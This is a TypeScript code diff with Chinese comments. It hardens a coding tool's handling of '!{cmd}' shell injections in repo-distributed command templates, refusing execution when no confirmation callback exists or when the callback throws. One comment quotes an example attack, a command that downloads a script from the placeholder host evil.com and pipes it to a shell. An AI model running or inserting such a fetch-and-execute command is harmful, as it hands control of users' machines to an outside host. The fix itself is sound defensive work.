@@ -134,12 +134,30 @@ async function processShellInjections(
 
   const commands = matches.map((m) => m[1].trim());
 
-  // 如果有确认回调，先请求用户确认
-  if (ctx.confirmShellCommands) {
-    const confirmed = await ctx.confirmShellCommands(commands);
-    if (!confirmed) {
-      return { result: template, confirmed: false };
-    }
+  // P2-3：无确认通道 → **拒绝执行**（fail-closed），不再静默直执行。
+  //
+  // `!{cmd}` 是一个真实的代码执行面：`.sid-code/commands/` 随版本库分发，
+  // clone 一个仓库就可能带进来一个 `!{curl evil.com/x.sh | sh}`。修复前这段是
+  // `if (ctx.confirmShellCommands) { ... }` —— 回调没注入就整段跳过，然后无条件
+  // execSync。它的正确性依赖"每一条现在和将来的路径都记得注入那个回调"。
+  //
+  // 生产路径本来就注入了真实弹窗（app.ts + adapter.ts 双向透传），所以**行为零变化**；
+  // 收益是把安全从约定变成结构。取向对齐 Skill 侧的 resolveSkillAsk：
+  // 那里三条兜底路径全部 return false，连"回调自己抛异常"都保守拒绝。
+  if (!ctx.confirmShellCommands) {
+    getLogger().warn("CUSTOM_CMD", "shell 注入需确认但无确认通道，拒绝执行");
+    return { result: template, confirmed: false };
+  }
+  let confirmed: boolean;
+  try {
+    confirmed = await ctx.confirmShellCommands(commands);
+  } catch (err: any) {
+    // 回调自身抛异常也保守拒绝：异常不能等于放行。
+    getLogger().warn("CUSTOM_CMD", `shell 注入确认回调异常，保守拒绝: ${err?.message}`);
+    return { result: template, confirmed: false };
+  }
+  if (!confirmed) {
+    return { result: template, confirmed: false };
   }
 
   let result = template;
